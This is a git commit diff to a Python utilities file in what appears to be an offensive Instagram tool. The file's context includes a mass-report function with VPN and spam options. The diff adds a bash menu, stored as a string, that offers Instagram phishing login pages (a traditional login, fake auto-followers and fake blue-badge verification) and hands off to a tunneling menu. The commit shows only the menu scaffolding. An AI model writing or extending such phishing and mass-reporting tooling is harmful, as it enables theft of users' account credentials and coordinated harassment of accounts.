ea7c1f16bb43539cd902daa5c2de78d9aedab8b7
GuptajiiHacker <155041576+GuptajiiHacker@users.noreply.github.com>
2024-02-08 21:33:28 +0530

    utils.py

--- cmd/utils.py
+++ cmd/utils.py
@@ -262,8 +262,33 @@ def insta_massreport(username, vpn, amount, spam_bool):
           c_while = c_while+1
 
 phishing_help = '''
-Phishing Tool Under Development! We are currently working on implementing the following phishing code: https://github.com/NullPulse/exaPhisher. 
-If you'd like to contribute, please feel free to create a pull request. Thank you for your patience and understanding!
+instagram(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option
+
+
+if [[ $ig_option == 1 || $ig_option == 01 ]]; then
+website="instagram"
+tunnel_menu
+elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
+website="ig_followers"
+tunnel_menu
+elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
+website="ig_verify"
+tunnel_menu
+
+else
+printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+
+}
 '''
 spam_phishing = '''
 
